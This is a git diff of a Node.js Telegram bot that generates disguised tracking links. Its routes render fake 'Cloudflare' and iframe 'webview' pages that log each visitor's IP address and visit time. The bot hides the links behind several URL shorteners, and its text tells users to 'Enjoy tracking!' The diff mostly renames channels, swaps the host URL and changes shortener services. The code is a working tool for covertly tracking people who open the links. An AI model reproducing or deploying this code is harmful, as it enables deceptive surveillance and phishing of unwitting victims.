@@ -1,26 +1,25 @@
 const fs = require("fs");
 const express = require("express");
-var cors = require('cors');
-var bodyParser = require('body-parser');
+const cors = require('cors');
+const bodyParser = require('body-parser');
 const fetch = require('node-fetch');
 const TelegramBot = require('node-telegram-bot-api');
 const bot = new TelegramBot(process.env["bot"], { polling: true });
-var jsonParser = bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' });
-var urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' });
 const app = express();
-app.use(jsonParser);
-app.use(urlencodedParser);
 app.use(cors());
+app.use(bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' }));
+app.use(bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' }));
 app.set("view engine", "ejs");
+
 // Modify your URL here
-var hostURL = "https://sgpapa.adaptable.app/";
-// TOGGLE for Shorteners
+var hostURL = "https://gen.djdjkdsk.repl.co";
+// TOGGLE for Shorters
 var use1pt = false;
 
 // Function to check if the user has joined the channel
 async function checkChannelMembership(chatId) {
   try {
-    const member = await bot.getChatMember("@SG_Modder1", chatId); // Replace "@SG_Modder1" with your channel's username
+    const member = await bot.getChatMember("@SG_Modder0", chatId); // Replace "@SG_Modder0" with your channel's username
     return member.status === "member" || member.status === "administrator" || member.status === "creator";
   } catch (error) {
     console.error("Error checking channel membership:", error);
@@ -38,7 +37,7 @@ app.get("/w/:path/:uri", (req, res) => {
     res.render("webview", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
   }
   else {
-    res.redirect("https://t.me/SG_Modder1");
+    res.redirect("https://t.me/hackerstoooools");
   }
 });
 
@@ -52,7 +51,7 @@ app.get("/c/:path/:uri", (req, res) => {
     res.render("cloudflare", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
   }
   else {
-    res.redirect("https://t.me/SG_Modder1");
+    res.redirect("https://t.me/hackerstoooools");
   }
 });
 
@@ -64,7 +63,7 @@ bot.on('message', async (msg) => {
     if (!isMember) {
       const joinButton = {
         text: "Join Channel",
-        url: "https://t.me/SG_Modder1"
+        url: "https://t.me/SG_Modder0"
       };
       const m = {
         reply_markup: JSON.stringify({ "inline_keyboard": [[joinButton]] })
@@ -83,7 +82,7 @@ bot.on('message', async (msg) => {
       reply_markup: JSON.stringify({ "inline_keyboard": [
         [{ text: "🌐 𝐂𝐫𝐞𝐚𝐭𝐞 𝐋𝐢𝐧𝐤 🌐", callback_data: "crenew" }],
         [{ text: "🔗 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐋𝐢𝐧𝐤 🔗", callback_data: "generateLink" }],
-        [{ text: "📡 𝐉𝐨𝐢𝐧 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 📡", url: "https://t.me/SG_Modder1" }]
+        [{ text: "📡 𝐉𝐨𝐢𝐧 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 📡", url: "https://t.me/SG_Modder0" }]
       ]})
     };
 
@@ -96,7 +95,7 @@ bot.on('message', async (msg) => {
     if (!isMember) {
       const joinButton = {
         text: "Join Channel",
-        url: "https://t.me/SG_Modder1"
+        url: "https://t.me/SG_Modder0"
       };
       const m = {
         reply_markup: JSON.stringify({ "inline_keyboard": [[joinButton]] })
@@ -110,7 +109,7 @@ bot.on('message', async (msg) => {
     if (!isMember) {
       const joinButton = {
         text: "Join Channel",
-        url: "https://t.me/SG_Modder1"
+        url: "https://t.me/SG_Modder0"
       };
       const m = {
         reply_markup: JSON.stringify({ "inline_keyboard": [[joinButton]] })
@@ -123,7 +122,7 @@ bot.on('message', async (msg) => {
 2. 𝗪𝗲𝗯𝘃𝗶𝗲𝘄 𝗟𝗶𝗻𝗸: 𝗧𝗵𝗶𝘀 𝘄𝗶𝗹𝗹 𝗱𝗶𝘀𝗽𝗹𝗮𝘆 𝗮 𝘄𝗲𝗯𝘀𝗶𝘁𝗲 𝘂𝘀𝗶𝗻𝗴 𝗶𝗳𝗿𝗮𝗺𝗲 𝘁𝗼 𝗰𝗼𝗹𝗹𝗲𝗰𝘁 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻.\n\n📝 𝗡𝗼𝘁𝗲: 𝗠𝗮𝗻𝘆 𝘀𝗶𝘁𝗲𝘀 𝗺𝗮𝘆 𝗻𝗼𝘁 𝘄𝗼𝗿𝗸 𝘂𝗻𝗱𝗲𝗿 𝘁𝗵𝗶𝘀 𝗺𝗲𝘁𝗵𝗼𝗱 𝗶𝗳 𝘁𝗵𝗲𝘆 𝗵𝗮𝘃𝗲 𝘅-𝗳𝗿𝗮𝗺𝗲 𝗼𝗽𝘁𝗶𝗼𝗻𝘀 𝘀𝗲𝘁. 𝗙𝗼𝗿 𝗲𝘅𝗮𝗺𝗽𝗹𝗲, 𝗵𝘁𝘁𝗽𝘀://𝗴𝗼𝗼𝗴𝗹𝗲.𝗰𝗼𝗺.\n\n🔍 𝗘𝗻𝗷𝗼𝘆 𝘁𝗿𝗮𝗰𝗸𝗶𝗻𝗴! 🕵️‍♂️🔍`);
   } // New command: /tutorial
   else if (msg.text == "/tutorial") {
-  const tutorialVideo = 'https://t.me/SG_Modder1/4398'; // Replace 'example.com/tutorial.mp4' with your tutorial video link
+  const tutorialVideo = 'https://t.me/SG_Modder0/4398'; // Replace 'example.com/tutorial.mp4' with your tutorial video link
   bot.sendVideo(chatId, tutorialVideo);
 }
  
@@ -165,7 +164,7 @@ bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
     if (!isMember) {
       const joinButton = {
         text: "Join Channel",
-        url: "https://t.me/SG_Modder1"
+        url: "https://t.me/SG_Modder0"
       };
       const m = {
         reply_markup: JSON.stringify({ "inline_keyboard": [[joinButton]] })
@@ -183,51 +182,38 @@ bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
 });
 
 async function createLink(cid, msg) {
-  const encoded = [...msg].some(char => char.charCodeAt(0) > 127);
+  var encoded = [...msg].some(char => char.charCodeAt(0) > 127);
 
   if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {
-    const url = `${cid.toString(36)}/${btoa(msg)}`;
-    const cUrl = `${hostURL}/c/${url}`;
-    const wUrl = `${hostURL}/w/${url}`;
+    var url = cid.toString(36) + '/' + btoa(msg);
+    var m = {
+      reply_markup: JSON.stringify({
+        "inline_keyboard": [
+          [{ text: "🔗 𝐂𝐫𝐞𝐚𝐭𝐞 𝐍𝐞𝐰 𝐋𝐢𝐧𝐤 🔗", callback_data: "crenew" }],
+          [{ text: "🌟 𝑮𝒆𝒏𝒆𝒓𝒂𝒕𝒆 𝑵𝒆𝒘 𝑳𝒊𝒏𝒌 🌟", callback_data: "generateLink" }]
+        ]
+      })
+    };
+
+       var cUrl = `${hostURL}/c/${url}`;
+    var wUrl = `${hostURL}/w/${url}`;
 
     bot.sendChatAction(cid, "typing");
 
     try {
-      const smolUrlResponse = await fetch('https://smolurl.com/api/links', {
-        method: 'POST',
-        headers: {
-          'Accept': 'application/json',
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ url: cUrl })
-      }).then(res => res.json());
+      var shrtcoResponse = await fetch(`https://api.shrtco.de/v2/shorten?url=${encodeURIComponent(cUrl)}`).then(res => res.json());
+      var isgdResponse = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(cUrl)}`).then(res => res.json());
+      var dagdResponse = await fetch(`https://da.gd/s?url=${encodeURIComponent(cUrl)}`).then(res => res.text());
+      var shrtcoResponse2 = await fetch(`https://api.shrtco.de/v2/shorten?url=${encodeURIComponent(wUrl)}`).then(res => res.json());
+      var isgdResponse2 = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(wUrl)}`).then(res => res.json());
+      var dagdResponse2 = await fetch(`https://da.gd/s?url=${encodeURIComponent(wUrl)}`).then(res => res.text());
 
-      const isgdResponse = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(cUrl)}`).then(res => res.json());
-      const smolUrlResponse2 = await fetch('https://smolurl.com/api/links', {
-        method: 'POST',
-        headers: {
-          'Accept': 'application/json',
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ url: wUrl })
-      }).then(res => res.json());
-
-      const isgdResponse2 = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(wUrl)}`).then(res => res.json());
-
-      const f = `\n➊ ${smolUrlResponse.data.short_url}\n➋ ${isgdResponse.shorturl}`;
-      const g = `\n➊ ${smolUrlResponse2.data.short_url}\n➋ ${isgdResponse2.shorturl}`;
+      var f = `\n➊ ${shrtcoResponse.result.short_link}\n➋ ${isgdResponse.shorturl}\n➌ ${dagdResponse}`;
+      var g = `\n➊ ${shrtcoResponse2.result.short_link}\n➋ ${isgdResponse2.shorturl}\n➌${dagdResponse2}`;
 
       const newLinksMessage = `🔗 𝗡𝗲𝘄 𝗟𝗶𝗻𝗸 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆.\n\n𝐔𝐑𝐋 ☛ ${msg}\n\n☁️ 𝐂𝐥𝐨𝐮𝐝𝐟𝐥𝐚𝐫𝐞 𝐏𝐚𝐠𝐞 𝐋𝐢𝐧𝐤𝐬👇${f}\n\n🌐 𝐖𝐞𝐛𝐕𝐢𝐞𝐰 𝐏𝐚𝐠𝐞 𝐋𝐢𝐧𝐤𝐬👇${g}`;
-      const replyMarkup = {
-        reply_markup: JSON.stringify({
-          "inline_keyboard": [
-            [{ text: "🔗 𝐂𝐫𝐞𝐚𝐭𝐞 𝐍𝐞𝐰 𝐋𝐢𝐧𝐤 🔗", callback_data: "crenew" }],
-            [{ text: "🌟 𝑮𝒆𝒏𝒆𝒓𝒂𝒕𝒆 𝑵𝒆𝒘 𝑳𝒊𝒏𝒌 🌟", callback_data: "generateLink" }]
-          ]
-        })
-      };
-      bot.sendMessage(cid, newLinksMessage, replyMarkup);
-    } catch (error) {
+      bot.sendMessage(cid, newLinksMessage, m);
+    } catch (error) { 
       console.error("Error creating short links:", error);
       bot.sendMessage(cid, "⚠️ 𝐀𝐧 𝐞𝐫𝐫𝐨𝐫 𝐨𝐜𝐜𝐮𝐫𝐫𝐞𝐝 𝐰𝐡𝐢𝐥𝐞 𝐜𝐫𝐞𝐚𝐭𝐢𝐧𝐠 𝐬𝐡𝐨𝐫𝐭 𝐥𝐢𝐧𝐤𝐬. ⚠️\n\n𝘗𝘭𝘦𝘢𝘴𝘦 𝘤𝘩𝘦𝘤𝘬 𝘵𝘩𝘦 𝘶𝘙𝘓 𝘪𝘯𝘱𝘶𝘵 𝘢𝘯𝘥 𝘵𝘳𝘺 𝘢𝘨𝘢𝘪𝘯. 🔄🔍🔗");
     }
@@ -238,10 +224,10 @@ async function createLink(cid, msg) {
 }
 
 async function createNew(cid) {
-  const replyMarkup = {
+  var mk = {
     reply_markup: JSON.stringify({ "force_reply": true })
   };
-  bot.sendMessage(cid, `🔗 𝑬𝒏𝒕𝒆𝒓 𝒀𝒐𝒖𝒓 𝑼𝑹𝑳 🔗`, replyMarkup);
+  bot.sendMessage(cid, `🔗 𝑬𝒏𝒕𝒆𝒓 𝒀𝒐𝒖𝒓 𝑼𝑹𝑳 🔗`, mk);
 }
 
 // New function: generateLinkButton
@@ -250,9 +236,9 @@ async function generateLinkButton(cid) {
   if (!isMember) {
     const joinButton = {
       text: "Join Channel",
-      url: "https://t.me/SG_Modder1" // Replace with your channel's URL
+      url: "https://t.me/SG_Modder0" // Replace "YourChannelUsername" with your channel's username
     };
-    const replyMarkup = {
+    const m = {
       reply_markup: JSON.stringify({ "inline_keyboard": [[joinButton]] })
     };
     const joinMessage = `🚨 **Attention!** 🚨\n\n🚀 𝗬𝗼𝘂 𝗺𝘂𝘀𝘁 𝗷𝗼𝗶𝗻 𝘁𝗵𝗲 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗯𝗲𝗳𝗼𝗿𝗲 𝘂𝘀𝗶𝗻𝗴 𝗼𝘁𝗵𝗲𝗿 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀. 🌟\n\n` +
@@ -262,7 +248,7 @@ async function generateLinkButton(cid) {
                         `3. If you have any questions, don't hesitate to ask. We're here to help! 💬🤗\n\n` +
                         `✨ 𝗝𝗼𝗶𝗻 𝘁𝗵𝗲 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗳𝗼𝗿 𝗲𝘅𝗰𝗹𝘂𝘀𝗶𝘃𝗲 𝘂𝗽𝗱𝗮𝘁𝗲𝘀. 𝗧𝗵𝗮𝗻𝗸 𝘆𝗼𝘂! 🌈🎉`;
 
-    bot.sendMessage(cid, joinMessage, { ...replyMarkup, parse_mode: "HTML" });
+    bot.sendMessage(cid, joinMessage, { ...m, parse_mode: "HTML" });
     return;
   }
   const socialMediaSites = [
@@ -274,7 +260,7 @@ async function generateLinkButton(cid) {
     { name: "📝Ｃｈａｔ-ＧＰＴ💬", url: "http://sgchatgpt.zapier.app/" },
     // Add more social media sites as needed
   ];
-  
+
   const generateButtonList = socialMediaSites.map(site => [{ text: site.name, callback_data: `gen_${site.url}` }]);
   
   // Sending the link buttons
@@ -286,7 +272,7 @@ async function generateLinkButton(cid) {
 
 async function checkChannelMembership(chatId) {
   try {
-    const member = await bot.getChatMember("@SG_Modder1", chatId); // Replace "@SG_Modder1" with your channel's username
+    const member = await bot.getChatMember("@SG_Modder0", chatId); // Replace "@SG_Modder0" with your channel's username
     return member.status === "member" || member.status === "administrator" || member.status === "creator";
   } catch (error) {
     console.error("Error checking channel membership:", error);
